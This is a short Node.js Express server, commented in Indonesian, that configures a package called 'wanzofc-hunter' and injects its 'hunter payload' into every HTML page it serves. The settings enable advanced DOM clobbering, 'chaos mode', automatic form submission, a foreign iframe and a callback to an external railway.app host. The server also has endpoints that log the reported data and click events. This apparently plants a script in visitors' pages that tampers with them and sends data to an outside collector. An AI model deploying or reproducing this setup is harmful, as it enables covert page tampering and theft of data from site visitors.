const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const { configure, expressMiddleware } = require('wanzofc-hunter');
const app = express();
const PORT = process.env.PORT || 3000;
configure({
    callbackURL: 'https://wanzofc-hunter.up.railway.app/report',
    iframeURL: 'https://nikka-api.vercel.app',
    domClobbering: true,
    domClobberingLevel: 'advanced',
    chaosMode: true,
    autoSubmitForms: true
});

app.use(bodyParser.json());

// Terima laporan hunter
app.post('/report', (req, res) => {
    console.log('>> Data Hunter <<');
    console.log(JSON.stringify(req.body, null, 2));
    res.status(200).send('Report diterima');
});

// Kalau browser GET /report
app.get('/report', (req, res) => {
    res.status(200).send('Endpoint report siap menerima data POST.');
});

// Terima klik tombol
app.post('/klik', (req, res) => {
    console.log('>> Event Klik Diterima <<');
    console.log(JSON.stringify(req.body, null, 2));
    res.status(200).send('Klik diterima!');
});

// Middleware inject hunter payload
app.use((req, res, next) => {
    const filePath = path.join(__dirname, req.path === '/' ? 'index.html' : req.path);

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            if (req.path.endsWith('.css') || req.path.endsWith('.js') || req.path.endsWith('.map')) {
                console.warn('File resource tidak ditemukan, diabaikan:', filePath);
                return res.status(204).send(); // No Content
            }
            console.error('File tidak ditemukan:', filePath);
            return res.status(404).send('404 Not Found');
        }

        res.body = data;
        expressMiddleware()(req, res, next);
    });
});

app.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
});
